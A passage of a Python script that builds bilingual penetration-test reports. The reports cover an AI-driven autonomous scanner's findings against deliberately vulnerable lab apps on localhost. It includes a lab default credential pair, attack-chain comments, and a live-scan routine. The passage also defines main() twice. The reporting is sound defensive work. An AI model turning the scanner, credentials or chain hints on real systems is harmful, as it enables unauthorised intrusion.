            "개념 증명(PoC)\n"
            "curl -I http://localhost:4000/\n"
            "HTTP/1.1 302 Found\n"
            "X-Powered-By: Express\n\n"
            "즉시 조치: app.js에서 헤더 비활성화: `app.disable('x-powered-by')`.\n"
            "단기 조치: 모든 응답 헤더 감사; helmet.js를 사용하여 헤더 정책 표준화.\n"
            "장기 조치: 스택 트레이스나 프레임워크 버전을 노출하지 않는 제네릭 오류 페이지."
        ),
        severity=Severity.low,
        finding_type="Information Disclosure",
        source_plugin="Brain/Manual",
        affected_component="All HTTP responses (X-Powered-By header)",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        evidence=[
            Evidence(
                evidence_type="http_response",
                title="X-Powered-By: Express present in all responses",
                content=(
                    "GET / HTTP/1.1\n"
                    "Host: localhost:4000\n\n"
                    "HTTP/1.1 302 Found\n"
                    "X-Powered-By: Express\n"
                    "Location: /login"
                ),
            ),
        ],
        mitre_attack=MitreAttack(tactic_id="TA0043", tactic_name="Reconnaissance", technique_id="T1592.002", technique_name="Gather Victim Host Information: Software"),
        references=[
            Reference(
                title="OWASP A05:2021 – Security Misconfiguration",
                url="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
            ),
        ],
    ),
]

NODEGOAT_EXECUTIVE_SUMMARY = (
    "VXIS conducted an AI-powered autonomous penetration test against OWASP NodeGoat "
    "(http://localhost:4000), a deliberately vulnerable Node.js/Express/MongoDB web application, "
    "using FileBasedBrain architecture with Claude Sonnet 4.6 as the reasoning engine. "
    "The Brain made over 130 autonomous decisions across 67 steps without hardcoded attack logic, "
    "dynamically discovering endpoints and generating context-aware payloads.\n\n"
    "A total of 7 confirmed vulnerabilities were identified: 1 Critical, 3 High, 2 Medium, 1 Low. "
    "The most severe finding is NG-006 (Plaintext Password Storage + Default Credentials, CVSS 9.1), "
    "where all passwords are stored in MongoDB in cleartext and default accounts (admin/Admin_123) are trivially exploitable. "
    "NG-007 (Server-Side JavaScript Injection, CVSS 8.8) confirms arithmetic expression evaluation on /contributions, "
    "presenting a code execution escalation path. "
    "NG-001 (CSRF, CVSS 8.1) and NG-002 (IDOR, CVSS 6.5) compound to enable full financial data exfiltration. "
    "The overall risk posture is CRITICAL. Immediate remediation of NG-006 and NG-007 is required "
    "before any production deployment."
    "|||"
    "VXIS가 FileBasedBrain 아키텍처와 Claude Sonnet 4.6을 추론 엔진으로 사용하여 "
    "OWASP NodeGoat(http://localhost:4000), 의도적으로 취약하게 설계된 Node.js/Express/MongoDB 웹 애플리케이션에 대한 "
    "AI 기반 자율 침투테스트를 수행했습니다. "
    "Brain이 하드코딩된 공격 로직 없이 67단계에 걸쳐 130회 이상의 자율 의사결정을 수행하며 "
    "동적으로 엔드포인트를 발견하고 컨텍스트 인식 페이로드를 생성했습니다.\n\n"
    "총 7개의 확인된 취약점이 식별되었습니다: 치명적 1개, 높음 3개, 중간 2개, 낮음 1개. "
    "가장 심각한 발견은 NG-006(평문 비밀번호 저장 + 기본 자격증명, CVSS 9.1)으로, "
    "모든 비밀번호가 MongoDB에 평문으로 저장되고 기본 계정(admin/Admin_123)이 즉시 악용 가능합니다. "
    "NG-007(서버 측 자바스크립트 인젝션, CVSS 8.8)은 /contributions에서 산술 표현식 평가를 확인하여 "
    "코드 실행 확장 경로를 제시합니다. "
    "NG-001(CSRF, CVSS 8.1)과 NG-002(IDOR, CVSS 6.5)의 복합은 완전한 금융 데이터 유출을 가능하게 합니다. "
    "전체 위험 수준은 치명적(CRITICAL)입니다. "
    "운영 환경 배포 전에 NG-006과 NG-007의 즉각적인 조치가 필요합니다."
)

NODEGOAT_ATTACK_CHAINS = [
    ["NG-006", "NG-002"],   # Default creds → admin login → IDOR all users
    ["NG-001", "NG-003"],   # CSRF bypass + user enumeration → account takeover
    ["NG-007", "NG-006"],   # SSJI → process.env → DB creds → all passwords
    ["NG-004", "NG-001"],   # Insecure cookie → CSRF amplification → session hijack
]


# =====================================================================
# MAIN
# =====================================================================

def main() -> None:
    gen = ReportGenerator()
    reports_dir = Path(__file__).parent / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)

    # --- DVWA Report ---
    dvwa_data = ReportData(
        scan_id="dvwa-bench-20260330",
        client_name="DVWA (Damn Vulnerable Web Application)",
        target="http://localhost:8080",
        scan_date="2026-03-30",
        findings=DVWA_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain",
        executive_summary=DVWA_EXECUTIVE_SUMMARY,
        attack_chains=DVWA_ATTACK_CHAINS,
    )

    dvwa_path = gen.generate_html_file(
        dvwa_data,
        reports_dir / "report_dvwa_20260330.html",
    )
    print(f"[OK] DVWA report: {dvwa_path}")
    print(f"     Findings: {dvwa_data.total_findings}")
    print(f"     Severity: {dvwa_data.severity_counts}")
    print(f"     Risk Score: {dvwa_data.risk_score}/10")

    # --- Juice Shop Report ---
    juice_data = ReportData(
        scan_id="juice-bench-20260330",
        client_name="OWASP Juice Shop",
        target="http://localhost:3000",
        scan_date="2026-03-30",
        findings=JUICE_SHOP_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain",
        executive_summary=JUICE_SHOP_EXECUTIVE_SUMMARY,
        attack_chains=JUICE_SHOP_ATTACK_CHAINS,
    )

    juice_path = gen.generate_html_file(
        juice_data,
        reports_dir / "report_juice_shop_20260330.html",
    )
    print(f"\n[OK] Juice Shop report: {juice_path}")
    print(f"     Findings: {juice_data.total_findings}")
    print(f"     Severity: {juice_data.severity_counts}")
    print(f"     Risk Score: {juice_data.risk_score}/10")

    # --- WebGoat Report ---
    webgoat_data = ReportData(
        scan_id="webgoat-2026-03-31",
        client_name="OWASP WebGoat 8.2 — VXIS Autonomous Scan",
        target="http://localhost:8080/WebGoat",
        scan_date="2026-03-31",
        findings=WEBGOAT_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
        attack_chains=WEBGOAT_ATTACK_CHAINS,
    )

    webgoat_path = gen.generate_html_file(
        webgoat_data,
        reports_dir / "report_webgoat_20260331.html",
    )
    print(f"\n[OK] WebGoat report: {webgoat_path}")
    print(f"     Findings: {webgoat_data.total_findings}")
    print(f"     Severity: {webgoat_data.severity_counts}")
    print(f"     Risk Score: {webgoat_data.risk_score}/10")

    # --- NodeGoat Report ---
    nodegoat_data = ReportData(
        scan_id="nodegoat-2026-03-31",
        client_name="OWASP NodeGoat (Node.js/Express/MongoDB)",
        target="http://localhost:4000",
        scan_date="2026-03-31",
        findings=NODEGOAT_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=NODEGOAT_EXECUTIVE_SUMMARY,
        attack_chains=NODEGOAT_ATTACK_CHAINS,
    )

    nodegoat_path = gen.generate_html_file(
        nodegoat_data,
        reports_dir / "report_nodegoat_20260331.html",
    )
    print(f"\n[OK] NodeGoat report: {nodegoat_path}")
    print(f"     Findings: {nodegoat_data.total_findings}")
    print(f"     Severity: {nodegoat_data.severity_counts}")
    print(f"     Risk Score: {nodegoat_data.risk_score}/10")


# =====================================================================
# LIVE SCAN REPORT GENERATION
# =====================================================================

# Finding type → CVSS / CWE / MITRE heuristic table
_FINDING_META: dict[str, dict] = {
    "sql_injection": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
        "cwe": ["CWE-89"], "severity": "critical",
        "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
    },
    "xss": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N", "score": 6.1,
        "cwe": ["CWE-79"], "severity": "medium",
        "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
    },
    "command_injection": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "score": 8.8,
        "cwe": ["CWE-78"], "severity": "critical",
        "mitre": ("TA0002", "Execution", "T1059", "Command and Scripting Interpreter"),
    },
    "ssrf": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", "score": 8.6,
        "cwe": ["CWE-918"], "severity": "high",
        "mitre": ("TA0009", "Collection", "T1090", "Proxy"),
    },
    "csrf": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N", "score": 6.5,
        "cwe": ["CWE-352"], "severity": "medium",
        "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
    },
    "idor": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N", "score": 7.1,
        "cwe": ["CWE-639"], "severity": "high",
        "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
    },
    "path_traversal": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N", "score": 7.5,
        "cwe": ["CWE-22"], "severity": "high",
        "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
    },
    "ssti": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
        "cwe": ["CWE-1336"], "severity": "critical",
        "mitre": ("TA0002", "Execution", "T1059", "Command and Scripting Interpreter"),
    },
    "nosql_injection": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "score": 9.1,
        "cwe": ["CWE-943"], "severity": "critical",
        "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
    },
    "broken_authentication": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H", "score": 9.8,
        "cwe": ["CWE-287"], "severity": "critical",
        "mitre": ("TA0006", "Credential Access", "T1110", "Brute Force"),
    },
    "information_disclosure": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": 5.3,
        "cwe": ["CWE-200"], "severity": "medium",
        "mitre": ("TA0009", "Collection", "T1005", "Data from Local System"),
    },
    "security_misconfiguration": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", "score": 5.3,
        "cwe": ["CWE-16"], "severity": "informational",
        "mitre": None,
    },
    "cors_misconfiguration": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N", "score": 6.5,
        "cwe": ["CWE-942"], "severity": "medium",
        "mitre": ("TA0009", "Collection", "T1185", "Browser Session Hijacking"),
    },
    "mass_assignment": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N", "score": 8.1,
        "cwe": ["CWE-915"], "severity": "high",
        "mitre": ("TA0004", "Privilege Escalation", "T1548", "Abuse Elevation Control Mechanism"),
    },
    "file_upload": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H", "score": 8.8,
        "cwe": ["CWE-434"], "severity": "critical",
        "mitre": ("TA0002", "Execution", "T1505", "Server Software Component"),
    },
    "forced_browsing": {
        "cvss": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:M/I:N/A:N", "score": 5.3,
        "cwe": ["CWE-425"], "severity": "medium",
        "mitre": ("TA0007", "Discovery", "T1083", "File and Directory Discovery"),
    },
}


_REMEDIATION_TEMPLATES: dict[str, str] = {
    "sql_injection": (
        "Immediate: Use parameterized queries or prepared statements for all database interactions.\n"
        "Short-term: Implement input validation and WAF rules to block SQL injection patterns.\n"
        "Long-term: Adopt an ORM framework and conduct regular security code reviews.\n"
        "|||\n"
        "즉시 조치: 모든 데이터베이스 쿼리에 파라미터화된 쿼리 또는 준비된 명령문을 사용하세요.\n"
        "단기 조치: 입력 유효성 검사 및 WAF 규칙을 구현하여 SQL 인젝션 패턴을 차단하세요.\n"
        "장기 조치: ORM 프레임워크를 도입하고 정기적인 보안 코드 리뷰를 실시하세요."
    ),
    "xss": (
        "Immediate: HTML-encode all user-supplied data before rendering in templates.\n"
        "Short-term: Implement a strict Content-Security-Policy header.\n"
        "Long-term: Use a templating engine with automatic context-aware escaping.\n"
        "|||\n"
        "즉시 조치: 템플릿에 렌더링하기 전에 모든 사용자 입력 데이터를 HTML 인코딩하세요.\n"
        "단기 조치: 엄격한 Content-Security-Policy 헤더를 구현하세요.\n"
        "장기 조치: 자동 컨텍스트 인식 이스케이핑을 지원하는 템플릿 엔진을 사용하세요."
    ),
    "command_injection": (
        "Immediate: Never pass user input directly to OS commands. Use safe APIs instead.\n"
        "Short-term: Implement strict allowlist validation for any system command parameters.\n"
        "Long-term: Refactor to eliminate OS command calls; use language-native libraries.\n"
        "|||\n"
        "즉시 조치: 사용자 입력을 OS 명령에 직접 전달하지 마세요. 안전한 API를 사용하세요.\n"
        "단기 조치: 시스템 명령 파라미터에 엄격한 허용 목록 검증을 구현하세요.\n"
        "장기 조치: OS 명령 호출을 제거하도록 리팩토링하고 언어 기본 라이브러리를 사용하세요."
    ),
    "csrf": (
        "Immediate: Implement CSRF tokens on all state-changing forms and AJAX requests.\n"
        "Short-term: Add SameSite=Strict cookie attribute and verify Origin/Referer headers.\n"
        "Long-term: Adopt a security framework with built-in CSRF protection.\n"
        "|||\n"
        "즉시 조치: 모든 상태 변경 폼과 AJAX 요청에 CSRF 토큰을 구현하세요.\n"
        "단기 조치: SameSite=Strict 쿠키 속성을 추가하고 Origin/Referer 헤더를 검증하세요.\n"
        "장기 조치: 내장 CSRF 보호 기능이 있는 보안 프레임워크를 채택하세요."
    ),
    "idor": (
        "Immediate: Implement server-side authorization checks for every resource access.\n"
        "Short-term: Use indirect object references (GUIDs) instead of sequential IDs.\n"
        "Long-term: Adopt an attribute-based access control (ABAC) model.\n"
        "|||\n"
        "즉시 조치: 모든 리소스 접근에 서버 측 인가 검사를 구현하세요.\n"
        "단기 조치: 순차 ID 대신 간접 객체 참조(GUID)를 사용하세요.\n"
        "장기 조치: 속성 기반 접근 제어(ABAC) 모델을 채택하세요."
    ),
    "ssrf": (
        "Immediate: Validate and allowlist permitted URLs/IP ranges for any server-side requests.\n"
        "Short-term: Block requests to internal network ranges (RFC1918) and metadata endpoints.\n"
        "Long-term: Use a proxy service with strict egress filtering for all outbound requests.\n"
        "|||\n"
        "즉시 조치: 서버 측 요청에 허용된 URL/IP 범위를 검증하고 허용 목록을 구성하세요.\n"
        "단기 조치: 내부 네트워크 범위(RFC1918) 및 메타데이터 엔드포인트에 대한 요청을 차단하세요.\n"
        "장기 조치: 모든 아웃바운드 요청에 엄격한 이그레스 필터링이 있는 프록시 서비스를 사용하세요."
    ),
    "security_misconfiguration": (
        "Immediate: Apply all missing security headers (CSP, HSTS, X-Frame-Options, X-Content-Type-Options).\n"
        "Short-term: Automate security header checks in CI/CD pipeline.\n"
        "Long-term: Establish a secure-by-default configuration baseline for all services.\n"
        "|||\n"
        "즉시 조치: 누락된 모든 보안 헤더(CSP, HSTS, X-Frame-Options, X-Content-Type-Options)를 적용하세요.\n"
        "단기 조치: CI/CD 파이프라인에서 보안 헤더 검사를 자동화하세요.\n"
        "장기 조치: 모든 서비스에 대한 기본 보안 구성 기준선을 수립하세요."
    ),
    "broken_authentication": (
        "Immediate: Remove or change all default credentials. Enforce strong password policies.\n"
        "Short-term: Implement MFA, rate limiting, and account lockout on authentication endpoints.\n"
        "Long-term: Adopt a zero-trust authentication model with continuous session validation.\n"
        "|||\n"
        "즉시 조치: 모든 기본 자격증명을 제거하거나 변경하세요. 강력한 비밀번호 정책을 적용하세요.\n"
        "단기 조치: 인증 엔드포인트에 MFA, 속도 제한, 계정 잠금을 구현하세요.\n"
        "장기 조치: 지속적인 세션 검증이 있는 제로 트러스트 인증 모델을 채택하세요."
    ),
}

_GENERIC_REMEDIATION = (
    "Immediate: Identify and isolate the vulnerable component. Apply vendor patches if available.\n"
    "Short-term: Implement input validation and output encoding for the affected functionality.\n"
    "Long-term: Conduct a full security review of similar components in the application.\n"
    "|||\n"
    "즉시 조치: 취약한 컴포넌트를 식별하고 격리하세요. 가능한 경우 벤더 패치를 적용하세요.\n"
    "단기 조치: 영향을 받는 기능에 대한 입력 유효성 검사 및 출력 인코딩을 구현하세요.\n"
    "장기 조치: 애플리케이션의 유사한 컴포넌트에 대해 전체 보안 검토를 수행하세요."
)


def _enrich_finding(f: Finding) -> Finding:
    """Heuristic 기반 finding 보강: CVSS/CWE/MITRE/remediation + NCC-style description."""
    ftype = getattr(f, "finding_type", "") or ""
    meta = _FINDING_META.get(ftype, {})
    endpoint = f.affected_component or f.target
    title_en = f.title.split("|||")[0].strip()

    # 1. CVSS / CWE / MITRE 할당
    if meta.get("cvss") and not f.cvss:
        f.cvss = CVSSVector(vector_string=meta["cvss"], base_score=meta["score"])
    if meta.get("cwe") and not f.cwe_ids:
        f.cwe_ids = meta["cwe"]
    if meta.get("mitre") and not f.mitre_attack:
        ta_id, ta_name, t_id, t_name = meta["mitre"]
        f.mitre_attack = MitreAttack(
            tactic_id=ta_id, tactic_name=ta_name,
            technique_id=t_id, technique_name=t_name,
        )

    # 2. NCC-style description (템플릿 기반, LLM 불필요)
    raw_desc = f.description or ""
    if "WHAT" not in raw_desc and "HOW" not in raw_desc:
        # 기존 raw desc를 구조화된 섹션으로 래핑
        structured_en = (
            f"WHAT — Vulnerability Description\n"
            f"{title_en} was identified at {endpoint}. "
            f"{raw_desc.split('|||')[0][:300]}\n\n"
            f"HOW — Step-by-Step Attack Scenario\n"
            f"Step 1: Identify the vulnerable endpoint at {endpoint}.\n"
            f"Step 2: Craft a {ftype.replace('_', ' ')} payload targeting the parameter.\n"
            f"Step 3: Submit the payload and observe the application response for indicators of success.\n"
            f"Step 4: Escalate the vulnerability by chaining with other findings if applicable.\n\n"
            f"IMPACT — Business Impact\n"
            f"- Potential unauthorized access to sensitive application functionality\n"
            f"- Risk of data exposure or integrity compromise\n"
            f"- Regulatory compliance violations (GDPR/PCI-DSS/ISO 27001)\n\n"
            f"PoC — Proof of Concept\n"
            f"Target: {endpoint}\n"
            f"Finding type: {ftype}\n"
            f"{raw_desc.split('|||')[0][:200]}\n\n"
            f"ATTACK PATH — Chain Analysis\n"
            f"This {ftype.replace('_', ' ')} vulnerability can be chained with other findings "
            f"to escalate privileges or achieve deeper system compromise."
        )
        # 간단한 한국어 요약
        raw_ko = raw_desc.split("|||")[1].strip() if "|||" in raw_desc else ""
        structured_ko = (
            f"취약점 설명(WHAT)\n"
            f"{endpoint}에서 {title_en} 취약점이 확인되었습니다. "
            f"{raw_ko[:200] if raw_ko else '자세한 내용은 영문 섹션을 참조하세요.'}\n\n"
            f"공격 시나리오(HOW)\n"
            f"1단계: {endpoint}의 취약한 엔드포인트를 식별합니다.\n"
            f"2단계: {ftype.replace('_', ' ')} 페이로드를 생성합니다.\n"
            f"3단계: 페이로드를 제출하고 응답에서 성공 지표를 확인합니다.\n"
            f"4단계: 다른 취약점과 체이닝하여 공격을 확대합니다.\n\n"
            f"비즈니스 영향(IMPACT)\n"
            f"- 민감한 애플리케이션 기능에 대한 무단 접근 가능성\n"
            f"- 데이터 노출 또는 무결성 손상 위험\n"
            f"- 규정 준수 위반 (GDPR/PCI-DSS/ISO 27001)\n\n"
            f"개념 증명(PoC)\n"
            f"대상: {endpoint}\n"
            f"취약점 유형: {ftype}\n\n"
            f"공격 경로(ATTACK PATH)\n"
            f"이 {ftype.replace('_', ' ')} 취약점은 다른 취약점과 체이닝하여 권한 상승 또는 더 깊은 침해로 이어질 수 있습니다."
        )
        f.description = f"{structured_en}\n|||\n{structured_ko}"

    # 3. Remediation (템플릿)
    if not f.remediation:
        f.remediation = _REMEDIATION_TEMPLATES.get(ftype, _GENERIC_REMEDIATION)

    # 4. Evidence — raw description을 evidence로 추가
    if not f.evidence:
        f.evidence = [Evidence(
            evidence_type="log",
            title=f"Scanner Detection — {ftype}",
            content=f"Finding detected at {endpoint}\n{(f.description or '')[:500]}",
        )]

    return f


def run_live_scan_and_report(
    target_name: str,
    target_url: str,
    client_name: str,
    output_path: Path,
    scan_id: str | None = None,
) -> Path | None:
    """실제 파이프라인 스캔 → finding 보강 → HTML 리포트 생성."""
    import asyncio
    import os
    from datetime import datetime, timezone

    # LLM_API_KEY → OPENAI_API_KEY alias
    if os.environ.get("LLM_API_KEY") and not os.environ.get("OPENAI_API_KEY"):
        os.environ["OPENAI_API_KEY"] = os.environ["LLM_API_KEY"]

    from vxis.agent.brain import AgentBrain
    from vxis.pipeline.pipeline import ScanPipeline
    from vxis.report.generator import ReportData, ReportGenerator

    brain = AgentBrain()
    pipeline = ScanPipeline(brain=brain)

    _scan_id = scan_id or f"live-{target_name}-{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}"

    print(f"\n  [SCAN] {target_name} — {target_url}")

    async def _run():
        return await pipeline.run(target=target_url)

    try:
        ctx = asyncio.run(_run())
    except Exception as exc:
        print(f"  [ERROR] Scan failed: {exc}")
        return None

    raw_findings = ctx.findings
    print(f"  [SCAN] Found {len(raw_findings)} raw findings — enriching with LLM...")

    enriched: list[Finding] = []
    for f in raw_findings:
        try:
            ef = _enrich_finding(f)
            enriched.append(ef)
            print(f"    ✓ {ef.id}: {ef.title.split('|||')[0][:60]}")
        except Exception as exc:
            print(f"    ✗ {f.id}: enrich failed ({exc})")
            enriched.append(f)

    # attack chains from score tracker
    chains = []
    for chain in ctx.score_tracker.attack_chains:
        step_ids = [s.finding_id for s in chain.steps if s.finding_id]
        if len(step_ids) >= 2:
            chains.append(step_ids)

    # executive summary via LLM
    exec_summary = ""
    if enriched:
        crit = sum(1 for f in enriched if str(f.severity) in ("critical", "Severity.critical"))
        high = sum(1 for f in enriched if str(f.severity) in ("high", "Severity.high"))
        try:
            exec_summary = brain._call_llm_with_fallback(
                "Write a concise executive summary for a penetration test report. English|||Korean format.",
                f"Target: {target_url}\nFindings: {len(enriched)} total, {crit} critical, {high} high.\n"
                f"Finding types: {list(set(f.finding_type for f in enriched))}.\n"
                f"Write a 3-4 sentence executive summary.",
            ) or ""
        except Exception:
            exec_summary = (
                f"VXIS autonomous scan of {target_url} identified {len(enriched)} security findings, "
                f"including {crit} critical and {high} high severity issues."
                f"|||VXIS 자율 스캔에서 {len(enriched)}개의 보안 취약점을 발견했으며, "
                f"그 중 {crit}개가 치명적, {high}개가 높은 심각도입니다."
            )

    report_data = ReportData(
        scan_id=_scan_id,
        client_name=client_name,
        target=target_url,
        scan_date=datetime.now(timezone.utc).strftime("%Y-%m-%d"),
        findings=enriched,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=exec_summary,
        attack_chains=chains,
    )

    gen = ReportGenerator()
    path = gen.generate_html_file(report_data, output_path)
    print(f"  [REPORT] {path}")
    print(f"     Findings: {report_data.total_findings}, Risk: {report_data.risk_score}/10")
    return path


def main_live() -> None:
    """실제 스캔 기반 리포트 생성 (--live 옵션)."""
    reports_dir = Path(__file__).parent / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)

    targets = [
        ("dvwa",       "http://localhost:8081",          "DVWA (Damn Vulnerable Web Application)"),
        ("juice-shop", "http://localhost:3000",           "OWASP Juice Shop"),
        ("webgoat",    "http://localhost:8888/WebGoat",  "OWASP WebGoat"),
        ("nodegoat",   "http://localhost:4000",          "OWASP NodeGoat"),
    ]

    from datetime import datetime, timezone
    date_str = datetime.now(timezone.utc).strftime("%Y%m%d")

    for name, url, client in targets:
        run_live_scan_and_report(
            target_name=name,
            target_url=url,
            client_name=client,
            output_path=reports_dir / f"report_{name}_live_{date_str}.html",
        )


def main() -> None:
    import sys
    if "--live" in sys.argv:
        main_live()
        return

    gen = ReportGenerator()
    reports_dir = Path(__file__).parent / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)

    # --- DVWA Report ---
    dvwa_data = ReportData(
        scan_id="dvwa-bench-20260330",
        client_name="DVWA (Damn Vulnerable Web Application)",
        target="http://localhost:8081",
        scan_date="2026-03-30",
        findings=DVWA_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=DVWA_EXECUTIVE_SUMMARY,
        attack_chains=DVWA_ATTACK_CHAINS,
    )
    dvwa_path = gen.generate_html_file(dvwa_data, reports_dir / "report_dvwa_20260330.html")
    print(f"[OK] DVWA: {dvwa_path} ({dvwa_data.total_findings} findings)")

    # --- Juice Shop Report ---
    juice_data = ReportData(
        scan_id="juice-bench-20260330",
        client_name="OWASP Juice Shop",
        target="http://localhost:3000",
        scan_date="2026-03-30",
        findings=JUICE_SHOP_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=JUICE_SHOP_EXECUTIVE_SUMMARY,
        attack_chains=JUICE_SHOP_ATTACK_CHAINS,
    )
    juice_path = gen.generate_html_file(juice_data, reports_dir / "report_juice_shop_20260330.html")
    print(f"[OK] Juice Shop: {juice_path} ({juice_data.total_findings} findings)")

    # --- WebGoat Report ---
    webgoat_data = ReportData(
        scan_id="webgoat-2026-03-31",
        client_name="OWASP WebGoat 8.2",
        target="http://localhost:8888/WebGoat",
        scan_date="2026-03-31",
        findings=WEBGOAT_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=WEBGOAT_EXECUTIVE_SUMMARY,
        attack_chains=WEBGOAT_ATTACK_CHAINS,
    )
    webgoat_path = gen.generate_html_file(webgoat_data, reports_dir / "report_webgoat_20260331.html")
    print(f"[OK] WebGoat: {webgoat_path} ({webgoat_data.total_findings} findings)")

    # --- NodeGoat Report ---
    nodegoat_data = ReportData(
        scan_id="nodegoat-2026-03-31",
        client_name="OWASP NodeGoat",
        target="http://localhost:4000",
        scan_date="2026-03-31",
        findings=NODEGOAT_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain (Claude Sonnet 4.6)",
        executive_summary=NODEGOAT_EXECUTIVE_SUMMARY,
        attack_chains=NODEGOAT_ATTACK_CHAINS,
    )
    nodegoat_path = gen.generate_html_file(nodegoat_data, reports_dir / "report_nodegoat_20260331.html")
    print(f"[OK] NodeGoat: {nodegoat_path} ({nodegoat_data.total_findings} findings)")


if __name__ == "__main__":
    main()
